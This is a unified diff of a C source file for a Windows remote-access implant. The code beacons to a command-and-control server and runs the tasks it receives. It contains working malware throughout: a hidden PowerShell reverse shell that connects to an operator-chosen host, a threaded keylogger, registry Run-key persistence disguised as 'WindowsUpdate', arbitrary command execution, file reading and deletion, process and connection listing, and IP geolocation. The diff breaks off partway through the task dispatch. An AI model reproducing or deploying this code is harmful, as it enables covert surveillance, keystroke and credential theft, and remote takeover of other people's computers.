@@ -1,38 +1,33 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
-#include <psapi.h>
-#include <tlhelp32.h>
-#include <iphlpapi.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <curl/curl.h>
 #include <json-c/json.h>
-#include <ctype.h>
-#include <time.h>
+#include <tlhelp32.h>  // Pour CreateToolhelp32Snapshot, Process32First, etc.
 
-#define OS "WINDOWS"
-#define SLEEP_SECONDS(s) Sleep((s) * 1000)
-#define JSON_BUFFER_SIZE 32768 // Taille augmentée pour éviter les dépassements
+#pragma comment(lib, "Ws2_32.lib")
 
-// Variables globales pour le keylogger et l'implant
+// Variables globales
+static FILE *keylogger_file = NULL;
 static int keylogger_running = 0;
-static char implant_uid[32] = {0};
-static FILE *keylog_file = NULL;
-static char keylog_filepath[MAX_PATH] = "keylog.txt";
+static HANDLE keylogger_thread = NULL;
 
-// Callback pour récupérer la réponse HTTP
+// Callback pour curl
 size_t write_callback(void *contents, size_t size, size_t nmemb, char *buffer) {
     size_t realsize = size * nmemb;
-    strncat(buffer, (char *)contents, realsize);
+    strncat_s(buffer, 8192, (char *)contents, realsize);
     return realsize;
 }
 
 // Nettoyer une chaîne
 void clean_string(char *str) {
     for (size_t i = 0; str[i] != '\0'; i++) {
-        if (str[i] == '\n' || str[i] == '\r' || str[i] < 32 || str[i] > 126) str[i] = ' ';
+        if (str[i] < 32 || str[i] > 126) {
+            str[i] = ' ';
+        }
     }
 }
 
@@ -41,7 +36,7 @@ static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr
 char *base64_encode(const char *input) {
     size_t input_len = strlen(input);
     size_t output_len = 4 * ((input_len + 2) / 3);
-    char *encoded = malloc(output_len + 1);
+    char *encoded = (char *)malloc(output_len + 1);
     if (!encoded) return NULL;
 
     size_t i, j;
@@ -71,177 +66,87 @@ char *base64_encode(const char *input) {
 // Exécuter une commande
 char *execute_command(const char *cmd) {
     char buffer[8192] = {0};
-    size_t buffer_len = 0;
-    FILE *fp = _popen(cmd, "r");
-    if (!fp) return strdup("Erreur : impossible d'exécuter la commande");
+    FILE *pipe = _popen(cmd, "r");
+    if (!pipe) return strdup("Error: Failed to execute command");
 
-    while (fgets(buffer + buffer_len, sizeof(buffer) - buffer_len, fp)) {
+    size_t buffer_len = 0;
+    while (fgets(buffer + buffer_len, sizeof(buffer) - buffer_len, pipe)) {
         buffer_len = strlen(buffer);
     }
-    _pclose(fp);
+    _pclose(pipe);
     clean_string(buffer);
     return strdup(buffer);
 }
 
 // Lire un fichier
 char *read_file(const char *filepath) {
-    FILE *fp = fopen(filepath, "rb");
-    if (!fp) return strdup("Erreur : impossible d'ouvrir le fichier");
+    FILE *fp;
+    fopen_s(&fp, filepath, "r");
+    if (!fp) return strdup("Error: Failed to open file");
 
-    fseek(fp, 0, SEEK_END);
-    long file_size = ftell(fp);
-    fseek(fp, 0, SEEK_SET);
-
-    if (file_size > 8192 - 1) file_size = 8192 - 1;
-    char *buffer = malloc(file_size + 1);
-    if (!buffer) {
-        fclose(fp);
-        return strdup("Erreur : allocation mémoire échouée");
+    char buffer[8192] = {0};
+    size_t buffer_len = 0;
+    char line[256];
+    while (fgets(line, sizeof(line), fp)) {
+        strncat_s(buffer, sizeof(buffer), line, sizeof(buffer) - buffer_len - 1);
+        buffer_len = strlen(buffer);
     }
-
-    size_t bytes_read = fread(buffer, 1, file_size, fp);
-    buffer[bytes_read] = '\0';
     fclose(fp);
-    clean_string(buffer);
-    return buffer;
-}
-
-// Lister les processus
-// Lister uniquement les noms des processus
-// Lister les noms des processus sans doublons
-char *list_processes() {
-    char buffer[16384] = {0}; // Buffer pour stocker la liste
-    size_t offset = 0;
-
-    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hProcessSnap == INVALID_HANDLE_VALUE) {
-        return strdup("Erreur : impossible de créer le snapshot des processus");
-    }
-
-    PROCESSENTRY32 pe32 = {0};
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-
-    if (!Process32First(hProcessSnap, &pe32)) {
-        CloseHandle(hProcessSnap);
-        return strdup("Erreur : échec de Process32First");
-    }
-
-    // Tableau dynamique pour stocker les noms uniques
-    char **unique_names = NULL;
-    int unique_count = 0;
-    int process_count = 0;
-
-    do {
-        char proc_name[MAX_PATH] = "unknown";
-        strncpy(proc_name, pe32.szExeFile, MAX_PATH - 1);
-        proc_name[MAX_PATH - 1] = '\0';
-
-        // Vérifier si le nom existe déjà
-        int is_duplicate = 0;
-        for (int i = 0; i < unique_count; i++) {
-            if (strcmp(unique_names[i], proc_name) == 0) {
-                is_duplicate = 1;
-                break;
-            }
-        }
-
-        // Si pas de doublon et limite non atteinte
-        if (!is_duplicate && process_count < 150) {
-            unique_names = realloc(unique_names, (unique_count + 1) * sizeof(char *));
-            if (!unique_names) {
-                CloseHandle(hProcessSnap);
-                return strdup("Erreur : échec allocation mémoire pour noms uniques");
-            }
-            unique_names[unique_count] = strdup(proc_name);
-            if (!unique_names[unique_count]) {
-                CloseHandle(hProcessSnap);
-                for (int i = 0; i < unique_count; i++) free(unique_names[i]);
-                free(unique_names);
-                return strdup("Erreur : échec allocation mémoire pour nom");
-            }
-            unique_count++;
-
-            // Ajouter le nom au buffer
-            offset += snprintf(buffer + offset, sizeof(buffer) - offset, "%s\n", proc_name);
-            process_count++;
-        }
-
-        if (offset >= sizeof(buffer) - MAX_PATH) break; // Limite de taille du buffer
-    } while (Process32Next(hProcessSnap, &pe32));
-
-    CloseHandle(hProcessSnap);
-
-    // Libérer la mémoire des noms uniques
-    for (int i = 0; i < unique_count; i++) {
-        free(unique_names[i]);
-    }
-    free(unique_names);
-
     clean_string(buffer);
     return strdup(buffer);
 }
+
+// Lister les processus
+char *list_processes() {
+    char buffer[8192] = {0};
+    size_t offset = 0;
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        return strdup("Error: Failed to get process list");
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(snapshot, &pe32)) {
+        do {
+            offset += snprintf(buffer + offset, sizeof(buffer) - offset, "%ws\n", pe32.szExeFile);
+        } while (Process32Next(snapshot, &pe32) && offset < sizeof(buffer) - 256);
+    }
+    CloseHandle(snapshot);
+    clean_string(buffer);
+    return strdup(buffer);
+}
+
 // Lister les sockets
 char *list_sockets() {
     char buffer[8192] = {0};
     size_t offset = 0;
+    FILE *pipe = _popen("netstat -ano | findstr ESTABLISHED", "r"); // Filtrer uniquement les connexions établies
+    if (!pipe) return strdup("Error: Failed to execute netstat");
 
+    // Ajouter un en-tête
     offset += snprintf(buffer + offset, sizeof(buffer) - offset,
-                       "Proto   Local Address          Foreign Address        State\n");
+                       "Proto  Local Address          Foreign Address        State\n");
 
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return strdup("Erreur : échec de Winsock");
-
-    PMIB_TCPTABLE2 pTcpTable = NULL;
-    ULONG ulSize = 0;
-
-    if (GetTcpTable2(pTcpTable, &ulSize, TRUE) == ERROR_INSUFFICIENT_BUFFER) {
-        pTcpTable = (MIB_TCPTABLE2 *)malloc(ulSize);
-        if (pTcpTable == NULL) {
-            WSACleanup();
-            return strdup("Erreur : allocation mémoire échouée");
-        }
-    }
-
-    if (GetTcpTable2(pTcpTable, &ulSize, TRUE) == NO_ERROR) {
-        for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
-            char local_str[INET_ADDRSTRLEN], remote_str[INET_ADDRSTRLEN];
-            struct in_addr local_addr, remote_addr;
-            local_addr.S_un.S_addr = pTcpTable->table[i].dwLocalAddr;
-            remote_addr.S_un.S_addr = pTcpTable->table[i].dwRemoteAddr;
-
-            inet_ntop(AF_INET, &local_addr, local_str, sizeof(local_str));
-            inet_ntop(AF_INET, &remote_addr, remote_str, sizeof(remote_str));
-
-            const char *state_str;
-            switch (pTcpTable->table[i].dwState) {
-                case MIB_TCP_STATE_CLOSED: state_str = "CLOSED"; break;
-                case MIB_TCP_STATE_LISTEN: state_str = "LISTEN"; break;
-                case MIB_TCP_STATE_ESTAB: state_str = "ESTABLISHED"; break;
-                case MIB_TCP_STATE_TIME_WAIT: state_str = "TIME_WAIT"; break;
-                default: state_str = "UNKNOWN"; break;
-            }
-
+    char line[256];
+    while (fgets(line, sizeof(line), pipe)) {
+        // Exemple de ligne : "  TCP    192.168.1.10:12345  8.8.8.8:80  ESTABLISHED  1234"
+        char proto[10], local[22], foreign[22], state[15];
+        if (sscanf(line, " %9s %21s %21s %14s", proto, local, foreign, state) == 4) {
             offset += snprintf(buffer + offset, sizeof(buffer) - offset,
-                               "tcp     %s:%u          %s:%u         %s\n",
-                               local_str, ntohs((u_short)pTcpTable->table[i].dwLocalPort),
-                               remote_str, ntohs((u_short)pTcpTable->table[i].dwRemotePort), state_str);
+                              "%-6s %-22s %-22s %-15s\n", proto, local, foreign, state);
+            if (offset >= sizeof(buffer) - 256) break; // Prévenir le débordement
         }
-    } else {
-        free(pTcpTable);
-        WSACleanup();
-        return strdup("Erreur : impossible de récupérer les connexions réseau");
     }
-
-    free(pTcpTable);
-    WSACleanup();
+    _pclose(pipe);
     clean_string(buffer);
     return strdup(buffer);
 }
 
-// Récupérer la localisation
+// Obtenir la localisation
 char *get_location() {
     CURL *curl = curl_easy_init();
-    if (!curl) return strdup("Erreur : échec de l'initialisation de curl");
+    if (!curl) return strdup("Error: Curl initialization failed");
 
     char buffer[8192] = {0};
     curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io/json");
@@ -251,190 +156,184 @@ char *get_location() {
     CURLcode res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
 
-    if (res != CURLE_OK) return strdup("Erreur : échec de la récupération de la localisation");
+    if (res != CURLE_OK) return strdup("Error: Failed to get location");
 
     struct json_object *parsed_json = json_tokener_parse(buffer);
-    if (!parsed_json) return strdup("Erreur : impossible de parser la réponse JSON");
+    if (!parsed_json) return strdup("Error: Failed to parse JSON");
 
     struct json_object *loc_field, *city_field, *country_field;
     char result[256] = {0};
     const char *loc = "unknown", *city = "unknown", *country = "unknown";
 
-    if (json_object_object_get_ex(parsed_json, "loc", &loc_field)) loc = json_object_get_string(loc_field);
-    if (json_object_object_get_ex(parsed_json, "city", &city_field)) city = json_object_get_string(city_field);
-    if (json_object_object_get_ex(parsed_json, "country", &country_field)) country = json_object_get_string(country_field);
+    if (json_object_object_get_ex(parsed_json, "loc", &loc_field))
+        loc = json_object_get_string(loc_field);
+    if (json_object_object_get_ex(parsed_json, "city", &city_field))
+        city = json_object_get_string(city_field);
+    if (json_object_object_get_ex(parsed_json, "country", &country_field))
+        country = json_object_get_string(country_field);
 
     snprintf(result, sizeof(result), "Latitude/Longitude: %s (%s, %s)", loc, city, country);
     json_object_put(parsed_json);
     return strdup(result);
 }
 
-// Reverse shell avec PowerShell
+// Reverse shell Windows
 char *send_reverse_shell(const char *lhost, int lport) {
-    if (!lhost || lport <= 0 || lport > 65535) return strdup("Erreur : LHOST ou LPORT invalide");
-
-    char ps_command[2048];
+    // Commande PowerShell encodée pour éviter les problèmes d'échappement
+    char ps_command[1024];
     snprintf(ps_command, sizeof(ps_command),
-             "powershell -NoP -NonI -W Hidden -Command \""
-             "$cl = New-Object System.Net.Sockets.TCPClient('%s',%d);"
-             "$bloblo = $cl.GetStream();"
-             "[byte[]]$blabla = 0..65535|%%{0};"
-             "while(($i = $bloblo.Read($blabla, 0, $blabla.Length)) -ne 0){;"
-             "$dodo = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($blabla,0, $i);"
-             "$banana = (iex $dodo 2>&1 | Out-String );"
-             "$banana2 = $banana;"
-             "$dragon = ([text.encoding]::ASCII).GetBytes($banana2);"
-             "$bloblo.Write($dragon,0,$dragon.Length);"
-             "$bloblo.Flush()};"
-             "$cl.Close()\"",
+             "powershell -NoProfile -ExecutionPolicy Bypass -Command \"$cl = New-Object System.Net.Sockets.TCPClient('%s',%d);$bloblo = $cl.GetStream();[byte[]]$blabla = 0..65535|%%{0};while(($i = $bloblo.Read($blabla, 0, $blabla.Length)) -ne 0){;$dodo = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($blabla,0, $i);$banana = (iex $dodo 2>&1 | Out-String );$banana2 = $banana;$dragon = ([text.encoding]::ASCII).GetBytes($banana2);$bloblo.Write($dragon,0,$dragon.Length);$bloblo.Flush()};$cl.Close()\"",
              lhost, lport);
 
-    STARTUPINFO si = { sizeof(si) };
-    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {0};
     si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = si.hStdOutput = si.hStdError = GetStdHandle(STD_INPUT_HANDLE);
 
-    BOOL success = CreateProcess(NULL, ps_command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    if (!success) {
-        return strdup("Erreur : échec de la création du processus PowerShell");
+    // Lancer PowerShell en mode caché
+    if (!CreateProcessA(NULL, ps_command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        return strdup("Error: Failed to create PowerShell process");
     }
 
-    Sleep(1000);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    return strdup("Reverse shell PowerShell envoyé");
+    return strdup("Reverse shell sent");
 }
 
-// Enregistrer les frappes dans le fichier
-void log_keys_to_file() {
-    if (!keylogger_running || !keylog_file) return;
-
-    char timestamp[32];
-    time_t now = time(NULL);
-    strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S] ", localtime(&now));
-
-    for (int key = 8; key <= 255; key++) {
-        if (GetAsyncKeyState(key) & 0x8000) {
-            char key_str[32];
-            if (key >= 32 && key <= 126) {
-                snprintf(key_str, sizeof(key_str), "%c", (char)(GetKeyState(VK_CAPITAL) & 0x0001 ? toupper(key) : tolower(key)));
-            } else {
-                switch (key) {
-                    case VK_RETURN: strcpy(key_str, "[ENTER]\n"); break;
-                    case VK_SPACE: strcpy(key_str, " "); break;
-                    case VK_BACK: strcpy(key_str, "[BACKSPACE]"); break;
-                    case VK_TAB: strcpy(key_str, "[TAB]"); break;
-                    case VK_SHIFT: strcpy(key_str, "[SHIFT]"); break;
-                    case VK_CONTROL: strcpy(key_str, "[CTRL]"); break;
-                    case VK_MENU: strcpy(key_str, "[ALT]"); break;
-                    case VK_CAPITAL: strcpy(key_str, "[CAPSLOCK]"); break;
-                    case VK_ESCAPE: strcpy(key_str, "[ESC]"); break;
-                    default: snprintf(key_str, sizeof(key_str), "[VK_%d]", key); break;
+// Thread
+DWORD WINAPI keylogger_thread_func(LPVOID lpParam) {
+    FILE *file = (FILE *)lpParam;
+    while (keylogger_running) {
+        for (int key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) == -32767) { // Touche pressée récemment
+                char key_str[32];
+                // Convertir le code en caractère lisible si possible
+                char key_char = (char)MapVirtualKeyA(key, MAPVK_VK_TO_CHAR);
+                if (key_char && key_char >= 32 && key_char <= 126) {
+                    snprintf(key_str, sizeof(key_str), "%c", key_char);
+                } else {
+                    snprintf(key_str, sizeof(key_str), "[VK_%d]", key);
                 }
+
+                if (file) {
+                    fputs(key_str, file);
+                    fflush(file); // Forcer l’écriture immédiate
+                }
+                printf("%s", key_str); // Pour debug dans la console
+                Sleep(50); // Réduire le délai
             }
-            fprintf(keylog_file, "%s%s", timestamp, key_str);
-            fflush(keylog_file);
         }
+        Sleep(10); // Boucle rapide
     }
+    if (file) fflush(file); // S’assurer que tout est écrit avant de quitter
+    return 0;
 }
 
-// Activer/Désactiver le keylogger
+// Activer/désactiver le keylogger
 char *toggle_keylogger(const char *state, const char *filepath) {
-    if (!state) return strdup("Erreur : état du keylogger non spécifié");
+    if (!state) return strdup("Error: Keylogger state not specified");
 
-    if (strcmp(state, "true") == 0 || strcmp(state, "on") == 0) {
-        if (keylogger_running) return strdup("Keylogger déjà activé");
+    if (_stricmp(state, "true") == 0 || _stricmp(state, "on") == 0) {
+        if (keylogger_running) return strdup("Keylogger already running");
 
-        if (filepath && strlen(filepath) > 0) {
-            strncpy(keylog_filepath, filepath, sizeof(keylog_filepath) - 1);
-            keylog_filepath[sizeof(keylog_filepath) - 1] = '\0';
+        // Utiliser un chemin absolu si possible
+        char full_path[MAX_PATH];
+        if (filepath && _stricmp(filepath, "null") != 0) {
+            // Si le chemin est relatif, le rendre absolu par rapport au répertoire courant
+            if (GetFullPathNameA(filepath, MAX_PATH, full_path, NULL) == 0) {
+                return strdup("Error: Failed to resolve file path");
+            }
+            if (fopen_s(&keylogger_file, full_path, "a") != 0 || !keylogger_file) {
+                return strdup("Error: Failed to open output file");
+            }
+        } else {
+            keylogger_file = NULL; // Pas de fichier spécifié
         }
-
-        keylog_file = fopen(keylog_filepath, "a");
-        if (!keylog_file) return strdup("Erreur : impossible d'ouvrir le fichier keylog");
 
         keylogger_running = 1;
-        char result[MAX_PATH + 50];
-        snprintf(result, sizeof(result), "Keylogger activé (fichier: %s)", keylog_filepath);
-        return strdup(result);
-    } else if (strcmp(state, "false") == 0 || strcmp(state, "off") == 0) {
-        if (!keylogger_running) return strdup("Keylogger déjà désactivé");
+        keylogger_thread = CreateThread(NULL, 0, keylogger_thread_func, keylogger_file, 0, NULL);
+        if (!keylogger_thread) {
+            keylogger_running = 0;
+            if (keylogger_file) fclose(keylogger_file);
+            return strdup("Error: Failed to create thread");
+        }
+
+        char msg[256];
+        snprintf(msg, sizeof(msg), "Keylogger activated%s%s",
+                 keylogger_file ? ", writing to " : "",
+                 keylogger_file ? full_path : "");
+        return strdup(msg);
+    }
+    else if (_stricmp(state, "false") == 0 || _stricmp(state, "off") == 0) {
+        if (!keylogger_running) return strdup("Keylogger already stopped");
 
         keylogger_running = 0;
-        if (keylog_file) {
-            fclose(keylog_file);
-            keylog_file = NULL;
+        WaitForSingleObject(keylogger_thread, INFINITE);
+        CloseHandle(keylogger_thread);
+        if (keylogger_file) {
+            fclose(keylogger_file);
+            keylogger_file = NULL;
         }
-        return strdup("Keylogger désactivé");
+        return strdup("Keylogger stopped");
     }
-    return strdup("Erreur : état invalide");
+    return strdup("Error: Invalid state (must be 'true'/'false' or 'on'/'off')");
 }
 
-// Chemin de l'exécutable
-char *get_executable_path() {
-    char path[MAX_PATH];
-    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) return strdup("Erreur : impossible de récupérer le chemin");
-    return strdup(path);
-}
-
-// Persistance
+// Persistance via registre
 char *toggle_persistence(const char *state) {
-    char *exec_path = get_executable_path();
-    if (strncmp(exec_path, "Erreur", 6) == 0) return exec_path;
+    char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, MAX_PATH);
 
-    if (strcmp(state, "true") == 0 || strcmp(state, "on") == 0) {
-        HKEY hKey;
-        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueEx(hKey, "MyImplant", 0, REG_SZ, (BYTE *)exec_path, strlen(exec_path) + 1);
-            RegCloseKey(hKey);
-            char result[MAX_PATH + 100];
-            snprintf(result, sizeof(result), "Persistance activée (registre) avec %s", exec_path);
-            free(exec_path);
-            return strdup(result);
-        }
-    } else if (strcmp(state, "false") == 0 || strcmp(state, "off") == 0) {
-        HKEY hKey;
-        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-            RegDeleteValue(hKey, "MyImplant");
-            RegCloseKey(hKey);
-        }
-        free(exec_path);
-        return strdup("Persistance désactivée");
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
+        return strdup("Error: Failed to open registry key");
     }
-    free(exec_path);
-    return strdup("Erreur : état invalide");
+
+    if (_stricmp(state, "true") == 0 || _stricmp(state, "on") == 0) {
+        if (RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return strdup("Persistence enabled (added to registry)");
+        }
+    }
+    else if (_stricmp(state, "false") == 0 || _stricmp(state, "off") == 0) {
+        if (RegDeleteValueA(hKey, "WindowsUpdate") == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return strdup("Persistence disabled (removed from registry)");
+        }
+    }
+    RegCloseKey(hKey);
+    return strdup("Error: Invalid persistence state");
 }
 
 // Déplacer un fichier
 char *move_file(const char *src, const char *dst) {
-    if (rename(src, dst) == 0) return strdup("Fichier déplacé avec succès");
-    return strdup("Erreur : impossible de déplacer le fichier");
+    if (MoveFileA(src, dst)) return strdup("File moved successfully");
+    return strdup("Error: Failed to move file");
 }
 
 // Supprimer un fichier
 char *remove_file(const char *filepath) {
-    if (remove(filepath) == 0) return strdup("Fichier supprimé avec succès");
-    return strdup("Erreur : impossible de supprimer le fichier");
+    if (DeleteFileA(filepath)) return strdup("File deleted successfully");
+    return strdup("Error: Failed to delete file");
 }
 
-// Requête DECLARE
-int perform_declare(CURL *curl, char *response, char *implant_uid_ptr, size_t implant_uid_size, char *username, char *hostname, char *os) {
+// Fonction DECLARE
+int perform_declare(CURL *curl, char *response, char *implant_uid, size_t implant_uid_size, char *username, char *hostname, char *os) {
     char json[8192];
     snprintf(json, sizeof(json), "{\"DECLARE\":{\"username\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\"}}", username, hostname, os);
-    printf("JSON DECLARE envoyé : %s\n", json);
+    printf("DECLARE JSON sent: %s\n", json);
 
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
     CURLcode res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
-        fprintf(stderr, "Erreur DECLARE : %s\n", curl_easy_strerror(res));
+        fprintf(stderr, "DECLARE error: %s\n", curl_easy_strerror(res));
         return 0;
     }
 
-    printf("Réponse DECLARE : %s\n", response);
+    printf("DECLARE response: %s\n", response);
 
     struct json_object *parsed_json = json_tokener_parse(response);
     if (!parsed_json) {
-        fprintf(stderr, "Erreur : impossible de parser la réponse JSON DECLARE\n");
+        fprintf(stderr, "Error: Failed to parse DECLARE JSON response\n");
         return 0;
     }
 
@@ -443,88 +342,68 @@ int perform_declare(CURL *curl, char *response, char *implant_uid_ptr, size_t im
         json_object_object_get_ex(ok_field, "UID", &uid_field)) {
         const char *uid = json_object_get_string(uid_field);
         if (uid) {
-            strncpy(implant_uid_ptr, uid, implant_uid_size - 1);
-            implant_uid_ptr[implant_uid_size - 1] = '\0';
-            printf("Nouvel implant-uid reçu : %s\n", implant_uid_ptr);
+            strncpy_s(implant_uid, implant_uid_size, uid, implant_uid_size - 1);
+            printf("New implant-uid received: %s\n", implant_uid);
             json_object_put(parsed_json);
             return 1;
         }
     }
-    fprintf(stderr, "Erreur : échec de l'extraction de l'implant-uid\n");
     json_object_put(parsed_json);
     return 0;
 }
 
 int main() {
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        fprintf(stderr, "Erreur : échec de l'initialisation de Winsock\n");
-        return 1;
-    }
-
     CURL *curl = curl_easy_init();
     if (!curl) {
-        fprintf(stderr, "Erreur : échec de l'initialisation de curl\n");
-        WSACleanup();
+        fprintf(stderr, "Error: Curl initialization failed\n");
         return 1;
     }
 
     curl_global_init(CURL_GLOBAL_ALL);
-    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
+    struct curl_slist *headers = NULL;
+    headers = curl_slist_append(headers, "Content-Type: application/json");
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
     curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api");
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
 
     char response[8192] = {0};
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+    char implant_uid[32] = {0};
     int sleep_time = 5, jitter = 2, not_found_count = 0;
 
-    char username[32], hostname[64], os[32] = OS;
+    char username[32], hostname[64], os[32] = "WINDOWS";
     DWORD username_len = sizeof(username);
-    GetUserName(username, &username_len);
+    GetUserNameA(username, &username_len);
     DWORD hostname_len = sizeof(hostname);
-    GetComputerName(hostname, &hostname_len);
+    GetComputerNameA(hostname, &hostname_len);
 
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
     if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
-        fprintf(stderr, "Échec du DECLARE initial\n");
+        fprintf(stderr, "Initial DECLARE failed\n");
         curl_slist_free_all(headers);
         curl_easy_cleanup(curl);
         curl_global_cleanup();
-        WSACleanup();
         return 1;
     }
 
-    // Remplacer la boucle while (1) dans main() par ceci :
     while (1) {
         memset(response, 0, sizeof(response));
-        char *json = malloc(JSON_BUFFER_SIZE);
-        if (!json) {
-            fprintf(stderr, "Erreur : échec allocation mémoire JSON\n");
-            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
-            continue;
-        }
-        json[0] = '\0';
-
-        snprintf(json, JSON_BUFFER_SIZE, "{\"FETCH\":\"%s\"}", implant_uid);
-        printf("JSON FETCH envoyé : %s\n", json);
+        char json[8192];
+        snprintf(json, sizeof(json), "{\"FETCH\":\"%s\"}", implant_uid);
+        printf("FETCH JSON sent: %s\n", json);
 
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
-        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
         CURLcode res = curl_easy_perform(curl);
         if (res != CURLE_OK) {
-            fprintf(stderr, "Erreur FETCH : %s\n", curl_easy_strerror(res));
-            free(json);
-            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
+            fprintf(stderr, "FETCH error: %s\n", curl_easy_strerror(res));
+            Sleep((sleep_time + (rand() % (jitter + 1))) * 1000);
             continue;
         }
 
-        printf("Réponse FETCH : %s\n", response);
+        printf("FETCH response: %s\n", response);
 
         struct json_object *parsed_json = json_tokener_parse(response);
         if (!parsed_json) {
-            fprintf(stderr, "Erreur : impossible de parser la réponse JSON FETCH\n");
-            free(json);
-            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
+            Sleep((sleep_time + (rand() % (jitter + 1))) * 1000);
             continue;
         }
 
@@ -533,28 +412,25 @@ int main() {
 
         if (json_object_object_get_ex(parsed_json, "error", &error_field)) {
             const char *error_msg = json_object_get_string(error_field);
-            printf("Erreur FETCH : %s\n", error_msg);
-            if (strcmp(error_msg, "NotFound") == 0) {
+            printf("FETCH error: %s\n", error_msg);
+            if (_stricmp(error_msg, "NotFound") == 0) {
                 not_found_count++;
                 if (not_found_count >= 50) {
-                    printf("Trop d'erreurs NotFound, réessai de DECLARE...\n");
+                    printf("Too many NotFound errors, retrying DECLARE...\n");
                     memset(implant_uid, 0, sizeof(implant_uid));
                     memset(response, 0, sizeof(response));
                     if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
-                        fprintf(stderr, "Échec du DECLARE, arrêt\n");
                         json_object_put(parsed_json);
                         curl_slist_free_all(headers);
                         curl_easy_cleanup(curl);
                         curl_global_cleanup();
-                        WSACleanup();
                         return 1;
                     }
                     not_found_count = 0;
                 }
             }
             json_object_put(parsed_json);
-            free(json);
-            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1)));
+            Sleep((sleep_time + (rand() % (jitter + 1))) * 1000);
             continue;
         }
 
@@ -564,96 +440,125 @@ int main() {
             json_object_object_get_ex(parsed_json, "action", &action_field)) {
             task_uid = strdup(json_object_get_string(task_uid_field));
 
-            struct json_object *ps_field;
-            if (json_object_object_get_ex(action_field, "PS", &ps_field)) {
+            struct json_object *execve_field, *sleep_field, *locate_field, *revshell_field;
+            struct json_object *keylog_field, *persist_field, *cat_field, *mv_field;
+            struct json_object *rm_field, *ps_field, *netstat_field;
+
+            if (json_object_object_get_ex(action_field, "EXECVE", &execve_field)) {
+                struct json_object *cmd_field, *args_field;
+                const char *cmd = NULL, *args = NULL;
+                if (json_object_object_get_ex(execve_field, "cmd", &cmd_field))
+                    cmd = json_object_get_string(cmd_field);
+                if (json_object_object_get_ex(execve_field, "args", &args_field))
+                    args = json_object_get_string(args_field);
+
+                char full_cmd[256];
+                if (args && _stricmp(args, "null") != 0)
+                    snprintf(full_cmd, sizeof(full_cmd), "%s %s", cmd, args);
+                else
+                    snprintf(full_cmd, sizeof(full_cmd), "%s", cmd);
+                result = execute_command(full_cmd);
+            }
+            else if (json_object_object_get_ex(action_field, "SLEEP", &sleep_field)) {
+                struct json_object *seconds_field, *jitter_field;
+                if (json_object_object_get_ex(sleep_field, "time", &seconds_field))
+                    sleep_time = json_object_get_int(seconds_field);
+                if (json_object_object_get_ex(sleep_field, "jitter", &jitter_field))
+                    jitter = json_object_get_int(jitter_field);
+                else
+                    jitter = 0;
+                result = strdup("Sleep time updated");
+            }
+            else if (json_object_object_get_ex(action_field, "LOCATE", &locate_field)) {
+                result = get_location();
+            }
+            else if (json_object_object_get_ex(action_field, "REVSHELL", &revshell_field)) {
+                struct json_object *lhost_field, *lport_field;
+                const char *lhost = "127.0.0.1";
+                int lport = 0;
+                if (json_object_object_get_ex(revshell_field, "host", &lhost_field))
